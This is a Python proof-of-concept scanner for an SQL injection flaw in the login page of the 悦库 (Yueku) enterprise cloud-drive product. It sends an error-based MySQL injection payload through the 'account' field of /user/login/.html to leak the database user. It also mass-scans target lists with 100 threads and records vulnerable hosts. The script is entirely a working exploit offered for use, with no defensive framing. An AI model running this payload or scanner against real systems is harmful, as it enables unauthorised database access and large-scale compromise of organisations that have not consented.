import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """
    <<<<<<悦库企业网盘 SQL注入漏洞>>>>>>>>
"""
    print(banner)


def poc(target):
    payload_url ="/user/login/.html"
    url = target+payload_url
    headers = {
        'Accept':'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding':'gzip, deflate',
        'X-Requested-With':'XMLHttpRequest',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
        'Content-Type':'application/x-www-form-urlencoded',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Priority':'u=1',
    }
    data = "account=') AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(5597=5597,user()))),0x7e),5597)-- HZLK"
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=5)
        if res.status_code == 200 and '~' in res.text:
            print(f"[+]该站点存在sql注入漏洞,url:{target}")
            with open ('success.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")
        else :
            print(f"[-]{target}该站点不存在sql注入漏洞")
            with open ('without-bug.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")
    except Exception as e:
        print(f"[?]{target}该网站异常")


def main():
    banner()
    parser = argparse.ArgumentParser(description="this is a 悦库企业网盘 SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='please input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == "__main__":
    main()